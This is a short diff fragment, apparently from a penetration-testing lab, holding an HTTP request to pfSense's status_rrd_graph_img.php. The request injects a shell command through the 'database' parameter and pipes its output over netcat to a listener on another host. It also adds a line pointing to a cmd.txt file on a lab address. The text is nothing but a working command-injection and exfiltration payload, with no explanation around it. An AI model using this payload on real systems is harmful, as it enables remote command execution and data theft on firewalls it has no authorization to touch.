@@ -1,4 +1,4 @@
-
+https://10.129.147.36/cmd.txt
 
 
 GET /status_rrd_graph_img.php?database=queues;pwd|nc+10.10.14.42+1234 HTTP/1.1
